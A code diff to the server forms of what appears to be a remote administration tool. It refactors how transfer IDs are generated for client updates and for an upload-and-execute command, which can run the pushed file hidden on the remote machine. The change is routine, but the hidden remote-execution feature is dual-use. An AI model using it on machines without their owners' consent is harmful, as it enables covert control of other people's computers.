@@ -417,7 +417,7 @@ namespace xServer.Forms
                                         break;
                                     }
 
-                                    int ID = new Random().Next(0, int.MaxValue);
+                                    int id = Helper.GetNewTransferId();
 
                                     CommandHandler.HandleSetStatus(c,
                                         new Core.Packets.ClientPackets.SetStatus("Uploading file..."));
@@ -432,7 +432,7 @@ namespace xServer.Forms
                                             error = true;
                                             break;
                                         }
-                                        new Core.Packets.ServerPackets.DoClientUpdate(ID, string.Empty, fileName, block, srcFile.MaxBlocks, currentBlock).Execute(c);
+                                        new Core.Packets.ServerPackets.DoClientUpdate(id, string.Empty, fileName, block, srcFile.MaxBlocks, currentBlock).Execute(c);
                                     }
                                 }
                             }).Start();
@@ -659,7 +659,7 @@ namespace xServer.Forms
                                     break;
                                 }
 
-                                int ID = new Random().Next(0, int.MaxValue);
+                                int id = Helper.GetNewTransferId();
 
                                 CommandHandler.HandleSetStatus(c,
                                     new Core.Packets.ClientPackets.SetStatus("Uploading file..."));
@@ -669,7 +669,7 @@ namespace xServer.Forms
                                     byte[] block;
                                     if (srcFile.ReadBlock(currentBlock, out block))
                                     {
-                                        new Core.Packets.ServerPackets.DoUploadAndExecute(ID,
+                                        new Core.Packets.ServerPackets.DoUploadAndExecute(id,
                                             Path.GetFileName(UploadAndExecute.FilePath), block, srcFile.MaxBlocks,
                                             currentBlock, UploadAndExecute.RunHidden).Execute(c);
                                     }
